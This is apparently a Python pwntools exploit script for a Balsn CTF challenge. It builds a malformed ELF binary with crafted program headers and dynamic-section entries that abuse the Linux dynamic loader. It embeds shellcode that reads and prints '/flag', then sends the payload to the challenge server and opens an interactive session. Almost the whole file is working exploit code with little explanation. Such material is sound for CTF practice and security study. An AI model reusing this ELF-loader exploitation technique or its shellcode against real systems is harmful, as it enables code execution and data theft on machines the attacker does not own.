from pwn import *
import binascii

context.arch = 'amd64'

ET_DYN = 3
ET_EXEC = 4

PT_LOAD = 1
PT_DYNAMIC = 2
PT_INTERP = 3
PT_PHDR = 6

FLAG_READ = 4
FLAG_WRITE = 2
FLAG_EXEC = 1

DT_NULL = 0
DT_NEEDED = 1 
DT_PLTGOT = 3
DT_STRTAB = 5
DT_SYMTAB = 6
DT_DEBUG = 21
DT_JMPREL = 23
DT_RUNPATH = 29
DT_PREINIT_ARRAY = 32
DT_PREINIT_ARRAYSZ = 33

l_info_offset = 0x40


def craftEhdr64(e_entry,e_phoff,e_phnum,e_shoff,e_shnum,e_shstrndx,e_ehsize=0x40,e_phentsize=0x38,e_shentsize=0x40,e_flags=0,e_type=3,e_machine=0x3e,e_version=1,EI_CLASS=2,EI_DATA=1,EI_VERSION=1,EI_OSABI=0,EI_PAD=0):
    return b'\x7fELF'+p8(EI_CLASS)+p8(EI_DATA)+p8(EI_VERSION)+p8(EI_OSABI)+p64(EI_PAD)+p16(e_type)+p16(e_machine)+p32(e_version)+p64(e_entry)+p64(e_phoff)+p64(e_shoff)+p32(e_flags)+p16(e_ehsize)+p16(e_phentsize)+p16(e_phnum)+p16(e_shentsize)+p16(e_shnum)+p16(e_shstrndx)

def craftPhdr64(p_type,p_flags,p_offset,p_vaddr,p_paddr,p_filesz,p_memsz,p_align):
    return p32(p_type)+p32(p_flags)+p64(p_offset)+p64(p_vaddr)+p64(p_paddr)+p64(p_filesz)+p64(p_memsz)+p64(p_align)

def craftDyn64(d_tag,d_ptr=0,d_val=0):
    if d_ptr!=0 and d_val!=0:
        print('d_ptr and d_val are union')
        exit()
    return p64(d_tag)+p64(d_ptr+d_val)


phdrcnt = 6
dyncnt = 9

ehdr = craftEhdr64(e_entry=0,e_phoff=0x40,e_phnum=phdrcnt,e_shoff=0,e_shnum=0,e_shstrndx=0)

phdr = craftPhdr64(p_type=PT_PHDR,
                   p_flags=FLAG_READ|0xeb000000,
                   p_offset=0x40,p_vaddr=0x40,p_paddr=0x40,
                   p_filesz=0x38*phdrcnt,p_memsz=0x38*phdrcnt,
                   p_align=8)+\
       craftPhdr64(p_type=PT_INTERP,
                   p_flags=FLAG_READ,
                   p_offset=0x40+0x38*phdrcnt+0x10*dyncnt,p_vaddr=0x40+0x38*phdrcnt+0x10*dyncnt,p_paddr=0x40+0x38*phdrcnt+0x10*dyncnt,
                   p_filesz=28,p_memsz=28,
                   p_align=0x1)+\
       craftPhdr64(p_type=PT_DYNAMIC,
                   p_flags=FLAG_READ,
                   p_offset=0x40+0x38*phdrcnt,p_vaddr=0x40+0x38*phdrcnt,p_paddr=0x40+0x38*phdrcnt,
                   p_filesz=0x10*dyncnt,p_memsz=0x10*dyncnt,
                   p_align=0x1)+\
       craftPhdr64(p_type=PT_DYNAMIC,
                   p_flags=FLAG_READ,
                   p_offset=0x40+0x38*phdrcnt+0x20,p_vaddr=0x40+0x38*phdrcnt+0x20,p_paddr=0x40+0x38*phdrcnt+0x20,
                   p_filesz=0,p_memsz=0,
                   p_align=0x1)+\
       craftPhdr64(p_type=PT_LOAD,
                   p_flags=FLAG_READ|FLAG_WRITE|FLAG_EXEC,
                   p_offset=0,p_vaddr=0,p_paddr=0,
                   p_filesz=0x1000,p_memsz=0x1000,    #alignment force map to null, only exploitable by root
                   p_align=0x1000000000000)+\
       craftPhdr64(p_type=PT_LOAD,
                   p_flags=FLAG_READ|FLAG_WRITE|FLAG_EXEC,
                   p_offset=0,p_vaddr=0x7f2000,p_paddr=0x7f2000,    #addr = 0x7f2f2e
                   p_filesz=0x1000,p_memsz=0x1000,
                   p_align=0x1000)

#can break at do_mmap in qemu for similar affects as catch syscall mmap
dyn = craftDyn64(d_tag=DT_JMPREL,d_ptr=0)+\
      craftDyn64(d_tag=DT_PLTGOT,d_ptr=0x7f3000++0x31190+l_info_offset+8*DT_PREINIT_ARRAY-8)+\
      craftDyn64(d_tag=DT_STRTAB,d_ptr=0x40+0x38*phdrcnt+0x10*dyncnt)+\
      craftDyn64(d_tag=DT_SYMTAB,d_val=0)+\
      craftDyn64(d_tag=DT_RUNPATH,d_val=28)+\
      craftDyn64(d_tag=DT_NEEDED,d_val=(1<<64)-0x23)+\
      craftDyn64(d_tag=DT_DEBUG,d_ptr=u64(b'\x00\x00\x00\x00\x00lib'))+\
      b'c.so.6\x00\x00'+p64(0)+\
      craftDyn64(d_tag=DT_NULL,d_val=0)
interpstr = b'/lib64/ld-linux-x86-64.so.2\x00'
runpath=b'./\x00'
shell = asm(f'''
             mov rdi, {u64(b'/flag'+p8(0)*3)}
             push rdi
             mov rdi, rsp
             mov rsi, 0
             mov rdx, 0
             mov rax, 2
             syscall
             mov rdi, rax
             mov rsi, rsp
             mov rdx, 0x100
             mov rax, 0
             syscall
             mov rdi, 1
             mov rsi, rsp
             mov rdx, rax
             mov rax, 1
             syscall
             mov rax, 0x3c
             mov rdi, 0
             syscall
             ''')

payload = ehdr+phdr+dyn+interpstr+runpath
payload = (payload.ljust(0xf2e,b'\x00')+shell).ljust(0x1000,b'\x00')

r = remote('elffortress.balsnctf.com',10101)
r.sendlineafter('filename length : ','1')
r.sendlineafter('filename : ',binascii.hexlify(b'\x7f'))
r.sendlineafter('filesize : ',str(len(payload)))
L = len(payload)
idx = 0
while idx<L:
    if L>idx+0x100:
        r.sendlineafter(' : ',binascii.hexlify(payload[idx:idx+0x100]))
        idx+=0x100
    else:
        r.sendlineafter(' : ',binascii.hexlify(payload[idx:L]))
        idx = L
r.interactive()
